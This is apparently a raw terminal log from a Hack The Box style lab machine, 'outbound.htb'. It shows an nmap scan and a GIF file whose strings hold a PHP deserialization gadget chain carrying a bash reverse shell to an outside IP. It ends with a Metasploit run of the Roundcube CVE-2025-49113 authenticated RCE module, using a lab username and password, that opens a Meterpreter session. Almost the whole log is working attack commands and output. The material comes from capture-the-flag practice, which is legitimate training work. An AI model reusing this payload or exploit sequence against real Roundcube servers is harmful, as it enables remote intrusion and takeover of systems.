```bash
└─# nmap --open -sS -sV -T5 -n -Pn -A 10.10.11.77
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 04:49 EDT
Nmap scan report for 10.10.11.77
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   49.13 ms 10.10.14.1
2   88.96 ms 10.10.11.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.55 seconds
```

```bash
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.77     mail.outbound.htb
```
```bash
└─# strings 'exploit(1).gif'                                                                                       
GIF89a
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:52:"bash -c 'bash -i >& /dev/tcp/10.10.14.105/4444 0>&1'";s:5:"level";N;}}s:8:"*xlevel";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}

┌──(root㉿kali)-[/home/kali/Downloads]
└─# strings 'exploit.gif'                                                                                        
GIF89a
@payload.txt
``

```bash
msf6 > search CVE-2025-49113

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization
   1    \_ target: Linux Dropper                            .                .          .      .
   2    \_ target: Linux Command                            .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Command'

msf6 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > show options

Module options (exploit/multi/http/roundcube_auth_rce_cve_2025_49113):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HOST                        no        The hostname of Roundcube server
   PASSWORD                    yes       Password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of the Roundcube Application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       Email User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Dropper



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set SRVPORT 80
SRVPORT => 80
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set SRVHOST 10.10.11.77
SRVHOST => 10.10.11.77
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST 10.10.14.123
LHOST => 10.10.14.123
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD LhKL1o9Nm3X2
PASSWORD => LhKL1o9Nm3X2
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME tyler
USERNAME => tyler
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS http://mail.outbound.htb/
RHOSTS => http://mail.outbound.htb/
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[*] Started reverse TCP handler on 10.10.14.123:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: iddjjBHYZ1evRXgRqMa5RqOQKr2iDund
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3045380 bytes) to 10.10.11.77
[*] Meterpreter session 1 opened (10.10.14.123:4444 -> 10.10.11.77:54704) at 2025-07-16 09:30:37 -0400
```
